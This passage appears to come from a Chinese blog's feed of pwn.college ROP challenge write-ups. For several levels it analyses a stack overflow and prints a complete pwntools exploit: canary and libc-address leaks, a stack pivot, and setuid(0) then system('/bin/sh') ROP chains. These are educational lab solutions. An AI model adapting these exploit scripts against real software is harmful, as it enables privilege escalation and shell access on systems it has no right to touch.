class="hljs-comment">#print(&quot;泄露出的返回地址=&#123;&#125;,认为偏移=&#123;&#125;，libc基地址=&#123;&#125;\n&quot;.format(hex(returnAddr),hex(iThinkRetOffset),hex(libcBase)))</span><br><br><span class="hljs-comment">#开始最后阶段调用system</span><br>ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br>payload4=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdiReal)+p64(<span class="hljs-number">0</span>)+p64(setuidAddr)+p64(pop_rdiReal)+p64(binshAddr)+p64(sysAddr)<br>ioHandler.recv()<br>ioHandler.send(payload4)<br><br>ioHandler.recv()<br>ioHandler.interactive()<br></code></pre></td></tr></table></figure><p>哎，所以总结一下，还是那句话，时刻拷问自己：什么是目的，什么是手段，防止陷入思维定势分不清目标<br></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>Program-Security</category>
      
      <category>ROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>level-13</title>
    <link href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-13/"/>
    <url>/2025/07/20/pwn.college/Program-Securtity/ROP/level-13/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>题目提示这道题存在canary保护，因此要想办法绕过canary（爆破或泄露）</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>老样子checksec看一下除了canary还开了什么，看到保护全开，只能ROP，但是还要想办法在运行时获取libc基地址<br><br>接下来靠IDA了，拖进去看一下发现可以在输入之前读取buffer起始地址和任意地址处的内容<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-13/IDA.png"><br>可以看到溢出点在main函数，在溢出点前面可以泄露buffer起始地址和一个任意地址处的内容<br><br>综上，漏洞点利用思路就清晰了：<br><br>应该分为两个阶段发送payload，这一点其实和第4题类似<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/">pwn.college题解：ROP-level-4</a><br><br>只不过多了需要泄露canary的步骤，以及需要换一种方法泄露libc基地址（因为开启了PIE，gadget不再可用）</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先，第一次泄露canary，由于题目会直接泄露buffer起始地址，只要用这个地址+(offset-16)，在第二次泄露时泄露该地址的值就是canary<br><br>接下来是泄露libc基地址以及返回程序开始的地方以触发第二阶段<br><br>但是，程序开启了PIE，无法像level-4那样，通过调用gadget直接打印某个libc函数的真实地址，并且通过pwn的symbols方法获取_start函数的地址以返回开始的地方<br><br>不过，注意到溢出点在main函数。根据main函数的启动和退出机制，见<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/Binary-Exp/">串联梳理：Pwn-Exp</a><br><br>所以低位覆盖，让它回到_libc_start_main即可开启二阶段；同样可以在第二阶段通过leak泄露返回地址的值，减去最低位的一个半字节即可<br><br>综上，可以编写出如下的利用脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level13.1&quot;</span><br>libcPath = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>],log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>ioHandler=process(targetELF)<br><span class="hljs-comment">#ioHandler=gdb.debug(targetELF,&quot;b *main+785&quot;)</span><br><br>offset=<span class="hljs-number">136</span><br><br><span class="hljs-comment">#/bin/sh字符串的偏移=0x1b45bd</span><br>binshOffset=<span class="hljs-number">0x1b45bd</span><br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br><br>gotAddr=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>pop_rdi_offset=<span class="hljs-number">0x23b6a</span><br>sysOffset=libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>setuidOffset=libc.symbols[<span class="hljs-string">&quot;setuid&quot;</span>]<br>binshOffset=<span class="hljs-number">0x1b45bd</span><br><br><br>ioHandler.recvuntil(<span class="hljs-string">&quot;[LEAK] Your input buffer is located at: &quot;</span>)<br>bufferStart=ioHandler.recvuntil(<span class="hljs-string">&#x27;.&#x27;</span>).decode()<br><span class="hljs-keyword">if</span> bufferStart[-<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;.&#x27;</span>:<br>    bufferStart=bufferStart[:-<span class="hljs-number">1</span>]<br>bufferStart=<span class="hljs-built_in">int</span>(bufferStart,<span class="hljs-number">16</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;Address in hex to read from:&quot;</span>)<br>canaryAddr=bufferStart+offset-<span class="hljs-number">16</span><br>ioHandler.sendline(<span class="hljs-built_in">hex</span>(canaryAddr).encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br>ioHandler.recvuntil(<span class="hljs-string">&quot; = &quot;</span>)<br>canary=ioHandler.recv().decode()<br>canary=<span class="hljs-built_in">int</span>(canary,<span class="hljs-number">16</span>)<br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+p64(canary)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x2D</span>.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>ioHandler.send(payload1)<br><br><br><span class="hljs-comment">#回来了</span><br>ioHandler.recvuntil(<span class="hljs-string">&quot;[LEAK] Your input buffer is located at: &quot;</span>)<br>bufferAgain=ioHandler.recvuntil(<span class="hljs-string">&#x27;.&#x27;</span>).decode()<br><span class="hljs-keyword">if</span> bufferAgain[-<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;.&#x27;</span>:<br>    bufferAgain=bufferAgain[:-<span class="hljs-number">1</span>]<br>bufferAgain=<span class="hljs-built_in">int</span>(bufferAgain,<span class="hljs-number">16</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;Address in hex to read from:&quot;</span>)<br>call_start=bufferAgain+offset<br>ioHandler.sendline(<span class="hljs-built_in">hex</span>(call_start).encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br>ioHandler.recvuntil(<span class="hljs-string">&quot; = &quot;</span>)<br>realCall_start=<span class="hljs-built_in">int</span>(ioHandler.recv().decode(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(realCall_start)<br>libcBase=realCall_start-<span class="hljs-number">0x24083</span>  <span class="hljs-comment">#为什么是24083，gdb看返回地址，最后3位是083，说明call main的指令偏移最后3位是083，再逆向libc.so，去里面找完整偏移??083，看到是24083</span><br><br>pop_rdiAddr=libcBase+pop_rdi_offset<br>sysAddr=libcBase+sysOffset<br>binshAddr=libcBase+binshOffset<br>setuidAddr=libcBase+setuidOffset<br><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+p64(canary)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdiAddr)+p64(<span class="hljs-number">0</span>)+p64(setuidAddr)+p64(pop_rdiAddr)+p64(binshAddr)+p64(sysAddr)<br><br>ioHandler.send(payload2)<br>ioHandler.recv()<br><br>ioHandler.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-13/flag.png"><br>总结一下，这道题其实不难，但却卡了很久，主要是因为：<br><br>一方面不熟悉main函数的启动和退出机制，对libc.so共享文件不了解<br><br>另一方面还是在前面的题目中形成了思维定势，没有分清什么才是目的什么只是手段<br><br>其实真正的目的就是泄露libc基址，可以通过puts函数等程序运行时调用的函数泄露（如第4题），也可以像这题一样，利用给exit传参的指令地址泄露，减去偏移<br><br>总的来说，只要能拿到libc里某条指令的真实值和偏移，就能拿到libc基址，不应该拘泥于必须通过什么手段去泄露</p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>Program-Security</category>
      
      <category>ROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>level-9</title>
    <link href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-9/"/>
    <url>/2025/07/20/pwn.college/Program-Securtity/ROP/level-9/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>需要我们用栈跃迁的方法去执行我们的ROP链<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>第一步依然是chekcsec，看到只开启了NX保护，说明要用ROP了<br><br>再用IDA逆向一下，看到在challenge函数中，会将输入存在0x4140E0的位置，并且只复制输入的前24个字节到缓冲区<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-9/challenge-IDA.png"><br>从这里就可以看出来，想把完整的ROP链布置到栈上是不可能了，因此漏洞点在于将启动ROP链的少部分代码写在最前面，通过启动代码把rsp的指向转移到完整的ROP链上<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先依然是ROPgadget命令获取必要碎片的地址，一般是pop rdi等传参需要的，参考<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/">pwn.college题解：ROP-level-4</a><br><br>最后，参考<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/Binary-Exp/">串联梳理：Pwn-Exp</a>中介绍的栈跃迁原理就可以写出下面的利用脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level9.0&quot;</span><br>libc_path = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>offset=<span class="hljs-number">72</span>  <span class="hljs-comment">#9.0不需要了，直接拷贝到返回地址</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><br><br>p = process(targetELF)<br><span class="hljs-comment">#p=gdb.debug(targetELF,&quot;b *challenge+86&quot;)</span><br>elf=ELF(targetELF)<br>libc = ELF(libc_path)<br>rop = ROP(elf)<br><br>leave_addr=<span class="hljs-number">0x4016ab</span><br>pop_rbp_addr=<span class="hljs-number">0x40129d</span><br>pop_rdi_addr=<span class="hljs-number">0x401c33</span>  <span class="hljs-comment">#pop rdi ret的地址</span><br>ret =<span class="hljs-number">0x40101a</span>    <span class="hljs-comment">#rop.find_gadget([&#x27;ret&#x27;])[0]</span><br>gotAddr=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br><span class="hljs-comment">#pop rbp，然后rbp需要=0x4140e0，然后leave+ret，即将rbp的值赋给rsp，然后pop rbp，最后pop rip</span><br><span class="hljs-comment">#为什么填0x4140f0：首先payload会被写到4140e0，加上为了栈迁移写的24个字节，按道理应该+0x18，但还要减去8，因为leave指令最后会pop一次rbp，即rsp+1，rsp要往下退一个内存格子</span><br><span class="hljs-comment">#这里正好退到0x4140f8，再把这个地址pop到rip（通过ret指令实现）</span><br>addrLeakPayload =p64(pop_rbp_addr)+p64(<span class="hljs-number">0x4140f0</span>)+p64(leave_addr)+p64(pop_rdi_addr)+p64(gotAddr)+p64(pltAddr)+p64(startAddr)<br><span class="hljs-comment">#addrLeakPayload = b&#x27;a&#x27;*offset + p64(pop_rdiAddr) + p64(gotAddr) +p64(ret)+p64(pltAddr) +p64(ret)+ p64(startAddr)</span><br><br>p.recv()<br>p.send(addrLeakPayload)<br>p.recvuntil(<span class="hljs-string">&quot;Leaving!\n&quot;</span>)<br>realAddr=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>libcBase=realAddr-<span class="hljs-number">0x84420</span><br><span class="hljs-comment">#system函数绝对地址</span><br>sysAddr = libcBase + <span class="hljs-number">0x52290</span>       <span class="hljs-comment">#libc.symbols[&#x27;system&#x27;] </span><br><span class="hljs-comment">#setuid函数绝对地址</span><br>setuidAddr = libcBase + <span class="hljs-number">0xe4150</span>    <span class="hljs-comment">#libc.symbols[&#x27;setuid&#x27;]</span><br><span class="hljs-comment">#binsh字符串绝对地址</span><br>binshAddr = libcBase + <span class="hljs-number">0x1b45bd</span>    <span class="hljs-comment">#next(libc.search(&quot;/bin/sh&quot;)) </span><br><br><span class="hljs-comment">#log.info(hex(sysAddr))</span><br><span class="hljs-comment">#log.info(hex(binshAddr))</span><br><br>shellPayload=p64(pop_rbp_addr)+p64(<span class="hljs-number">0x4140f0</span>)+p64(leave_addr)+ p64(pop_rdi_addr) + p64(<span class="hljs-number">0</span>) + p64(setuidAddr)  + p64(pop_rdi_addr) + p64(binshAddr) + p64(sysAddr)<br><br>p.recv()<br>p.send(shellPayload)<br>p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-9/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>Program-Security</category>
      
      <category>ROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>level-4</title>
    <link href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/"/>
    <url>/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>需要我们构造ROP链来执行获取shell的代码段，进而拿到flag<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先还是checksec看到只开了NX，既然如此shellcode执行不了<br><br>接着拖到IDA里面发现并没有可以用的后门函数，因此只能采用ROP<br><br>然后找溢出点，发现在challenge函数<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/IDA-challenge.png"><br>再通过ROPgadget工具，看看程序本身有没有可用的碎片：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary /challenge/babyrop_level4.0 &gt;gadgets.txt<br></code></pre></td></tr></table></figure><p>在输出文件里找了一番，没发现system、binsh等可用的组件，只找到了勉强可以用来传参的pop rdi指令<br><br>那只能在libc里找一下看有没有system之类的函数：<br><br>首先确定程序链接的libc版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldd /challenge/babyrop_level4.0<br></code></pre></td></tr></table></figure><p>可以看到是&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/ldd.png"><br>然后找相应的可用函数<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system<br>strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh<br></code></pre></td></tr></table></figure><p><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/find-in-libc.png"><br>如上图，这两条命令的输出都表示找到了我们想要的函数及其参数<br><br>因此漏洞点利用思路就比较清晰了，需要寻找libc中函数的地址（通过泄露Libc基址来实现），然后溢出返回地址到libc中<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>这道题目中需要返回到Libc中，因此首先需要知道libc的基地址，因此需要泄露一个libc中函数的真实地址来计算基地址<br><br>综上，构造一个两阶段的利用脚本，第一次泄露puts函数真实地址，并重新执行程序，第二次再发送真正的利用payload，拿到shell：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level4.0&quot;</span><br>libc_path = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>offset=<span class="hljs-number">56</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br><br><br>p = process(targetELF)<br><span class="hljs-comment"># p=gdb.debug(targetELF,&quot;b *challenge&quot;)</span><br>elf=ELF(targetELF)<br>libc = ELF(libc_path)<br>rop = ROP(elf)<br><br>pop_rdiAddr=<span class="hljs-number">0x402204</span>  <span class="hljs-comment">#pop rdi ret的地址</span><br>ret =<span class="hljs-number">0x40101a</span>    <span class="hljs-comment">#rop.find_gadget([&#x27;ret&#x27;])[0]</span><br>gotAddr=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br><br>addrLeakPayload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p64(pop_rdiAddr) + p64(gotAddr) + p64(pltAddr) + p64(startAddr)<br><br><span class="hljs-comment"># open(&quot;PayLoad&quot;,&quot;wb&quot;).write(addrLeakPayload)</span><br><br>p.recv()<br>p.send(addrLeakPayload)<br>p.recvuntil(<span class="hljs-string">&quot;Leaving!\n&quot;</span>)<br>realAddr=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>libcBase=realAddr-<span class="hljs-number">0x84420</span><br>sysAddr = libcBase + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]  <span class="hljs-comment">#system函数地址</span><br>setuidAddr = libcBase + libc.symbols[<span class="hljs-string">&#x27;setuid&#x27;</span>]<br>binshAddr = libcBase + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))  <span class="hljs-comment"># /bin/sh字符串地址</span><br><br>log.info(<span class="hljs-built_in">hex</span>(sysAddr))<br>log.info(<span class="hljs-built_in">hex</span>(binshAddr))<br><br>shellPayload= <span class="hljs-string">b&#x27;1&#x27;</span> * offset + p64(pop_rdiAddr) + p64(<span class="hljs-number">0</span>) + p64(setuidAddr) + p64(ret) + p64(pop_rdiAddr) + p64(binshAddr) + p64(ret) + p64(sysAddr)<br><br>p.recv()<br>p.send(shellPayload)<br>p.recv()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>大概解释一下脚本里的一些语句是什么意思（更详细的还得看pwntools的手册）<br><br>首先，主要的就是ELF类，通过传递一个ELF文件的路径，可以打开该文件，然后获得一个ELF对象（第10、11行分别拿到目标程序和libc.so的ELF对象）<br><br>通过该elf对象可以获取ELF文件中函数的plt表、got表（脚本中的gotAddr和pltAddr），以及函数符号表，即函数地址（如第18行获取_start函数的地址）<br><br>第一阶段，需要通过一个输出函数（如puts、printf）泄露got表地址，然后再回到程序的开始（即startAddr），所以第一阶段的payload（即addrLeakPayLoad）&#x3D;b’a’*offset + p64(pop_rdiAddr) + p64(gotAddr) + p64(pltAddr) + p64(startAddr)<br><br>泄露地址后通过减去puts函数的偏移得到libc基地址,即第29行（偏移可以通过readelf或者pwn库获得），最后，构造的shellPayload（第37行）才为真正getshell的payload<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-4/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>Program-Security</category>
      
      <category>ROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>level-3</title>
    <link href="/2025/07/20/pwn.college/Program-Securtity/ROP/level-3/"/>
    <url>/2025/07/20/pwn.college/Program-Securtity/ROP/level-3/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>题面很简单，提示我们了，需要使用ROP去触发一个多阶段的win函数</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>拖进IDA，看到溢出点发生在challenge函数，如图<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/IDA-challenge.png"><br>然后checksec看看开启了哪些保护<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-1.png"><br>可以发现只开启了NX，不能自己写shellcode<br><br>接下来尝试寻找后门函数，注意到IDA逆向结果显示有5个win函数，基本可以猜测就是输出flag的后门函数，分别点进去分析源码，如下5张图所示<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-1.png"><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-2.png"><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-3.png"><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-4.png"><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/win-stage-5.png"><br>可以观察到每个函数只输出一部分flag，并且会检查参数是否等于stage编号<br><br>由此，结合题面提示，漏洞点就清晰了：利用溢出，构造ROP链，按顺序调用这5个win函数即可</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先，依然是确定偏移量，在IDA里可以直接读出来offset&#x3D;0x40+0x8&#x3D;0x48<br><br>接下来寻找可用的指令碎片（一般是找ret，以及如果是64位程序，还要找传参用的pop rdi; ret序列），通过ROPgadget工具：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary /challenge/babyrop_level3.1 &gt;gadgets.txt<br></code></pre></td></tr></table></figure><p>之后在gadgets.txt中搜索到ret指令和pop rdi指令：<br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-3/gadget.png"><br>可以看到我们想要的指令分别在0x402373和0x40101a<br>最后，分别找到5个win函数的地址，可以使用objdump工具，或者在IDA里看<br><br>由于没有开启PIE，上述找到的地址均可直接使用（即写死在脚本里）<br>有了以上信息，可以编写出如下利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> os<br>returnAddr1=<span class="hljs-number">0x402132</span><br>gadgetAddr=<span class="hljs-number">0x402373</span><br>returnAddr2=<span class="hljs-number">0x401f6c</span><br>returnAddr3=<span class="hljs-number">0x401da7</span><br>returnAddr4=<span class="hljs-number">0x40204c</span><br>returnAddr5=<span class="hljs-number">0x401e89</span><br>offset=<span class="hljs-number">72</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level3.1&quot;</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span>*offset+p64(gadgetAddr)+p64(<span class="hljs-number">0x1</span>)+p64(returnAddr1)+p64(gadgetAddr)+p64(<span class="hljs-number">0x2</span>)+p64(returnAddr2)+p64(gadgetAddr)+p64(<span class="hljs-number">0x3</span>)+p64(returnAddr3)+p64(gadgetAddr)+p64(<span class="hljs-number">0x4</span>)+p64(returnAddr4)+p64(gadgetAddr)+p64(<span class="hljs-number">0x5</span>)+p64(returnAddr5)<br>p.recvuntil(<span class="hljs-string">&#x27;###\n&#x27;</span>)<br>p.send(payload)<br><span class="hljs-comment">#p.interactive()</span><br>output = p.recvall()<br><span class="hljs-built_in">print</span>(output.decode())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>Program-Security</category>
      
      <category>ROP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hijack-to-Shellcode</title>
    <link href="/2025/07/20/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/"/>
    <url>/2025/07/20/pwn.college/Intro-to-Cybersecurity/Pwn/Hijack-to-Shellcode/</url>
    
